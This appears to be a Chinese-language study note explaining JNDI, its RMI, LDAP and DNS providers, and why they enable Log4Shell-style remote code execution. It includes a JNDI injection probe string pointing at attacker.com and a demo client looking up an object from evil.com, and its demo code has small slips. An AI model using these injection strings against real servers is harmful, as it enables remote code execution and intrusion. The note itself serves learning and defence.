---
title: JNDI基础
description: JNDI架构、Context、InitialContext、lookup、RMI协议、LDAP协议、DNS协议、SPI机制
tags: [jndi, naming-service, directory-service, rmi, ldap, spi]
status: 已完成
finish-date: 2026-06-01
difficulty: 中等
---

## JNDI基础概念
### JNDI
JNDI（Java Naming and Directory Interface）是 Java 提供的目录/命名服务 API，让程序通过名字找到资源（对象、服务、数据源等）
### Context（上下文）
- Context = 一个命名空间
- 里面有一组 名字 → 对象 的绑定关系
### InitialContext（初始化上下文）
- JNDIr入口
- 用来创建初始的Context()
`Context ctx=new InitialContext();`
### lookup()
- 用来通过名字查找对象
`Object obj=ctx.lookup("java:MyService");`
## JNDI架构
### JNDI为什么需要“协议:
JNDI 只是一个 API 标准，它不自己干活。
>就像 USB 接口标准一样，USB 接口本身不会传输数据，需要具体协议（USB 2.0 / 3.0 / Type-C）来干活。

---
例如：
`ctx.lookup("rmi://localhost:1099/hello")`
- rmi:// 告诉 JNDI：请使用 RMI 协议提供者
- JNDI 内部会找到对应的 SPI 实现，去连接 RMI 注册表
### RMI（Java Remote Method Invocation）
1. RMI是什么：java自带的远程调用机制，允许一个JVM中的对象调用另一个JVM中的对象
2. RMI三要素

    | 角色 | 作用 |
    |------|------|
    | RMI 注册表（Registry） | 存放“名字 → 远程对象”的绑定关系，默认端口 1099 |
    | RMI 服务端 | 把对象注册到 Registry |
    | RMI 客户端 | 从 Registry 查找对象，然后调用远程方法 |

    ---

3. JNDI + RMI 的 URL 格式
   `ctx.lookup("rmi://192.168.1.100:1099/UserService")` 
   - rmi:// → 协议
   - 192.168.1.100:1099 → RMI 注册表地址
   - UserService → 绑定的名字
4. 为什么 RMI 是 Log4Shell 的攻击入口？
    因为 RMI 可以返回一个引用指向远程对象，客户端会自动下载并执行。

    >重点：RMI 支持 动态加载远程类（java.rmi.server.codebase）

    ---

### LDAP（Lightweight Directory Access Protocol）
1. LDAP是什么：轻量级目录访问协议，用于访问目录服务（如企业员工通讯录、组织架构、Active Directory）
2. JNDI + LDAP 的 URL 格式
   `ctx.lookup("ldap://localhost:389/cn=admin,dc=example,dc=com")` 
3. 安全缺陷
   - JNDI 默认信任 LDAP 返回的代码库地址
   - 没有校验该地址是否合法
### DNS
1. JNDI + DNS 能干什么
   `ctx.lookup("dns:///example.com")`
   - 可以查询 DNS 记录（A、TXT、MX 等）
2.  DNS 常用于探测漏洞是否存在
    攻击者让受害服务器发起一次 DNS 查询：
    ```java
    ${jndi:ldap://attacker.com/evil}
    ```
    如果受害者真的去查 attacker.com，说明 JNDI lookup 被执行。
    所以 DNS 不是直接攻击协议，而是盲打探测工具
### SPI
>JNDI 定义了一套“找东西的流程”，SPI 是“具体怎么找”的插件。

---

1. 常见的 JNDI SPI 实现

    | SPI 实现 | 支持的协议 |
    |----------|-------------|
    | com.sun.jndi.rmi | rmi:// |
    | com.sun.jndi.ldap | ldap:// |
    | com.sun.jndi.dns | dns:// |  

    ---
### 小结
RMI 和 LDAP 都能返回一个指向恶意 Java 对象的引用，受害者 JNDI lookup 后自动加载并执行，从而实现远程代码执行（RCE）。
## 手工JNDI Demo
>目标搭建极简的RMI服务端编写客户端，并理解 lookup 流程。

### 客户端
```java
import javax.naming.Context;
import javax.naming.InitialContext;

public class ClientDemo{
    public static void main(String[] args) {
        Context ctx=new InitialContext();
        Object obj=ctx.lookup("rmi://evil.com:1099/hello");
        System.out.println("obj");
        ctx.close();
    }
}
```

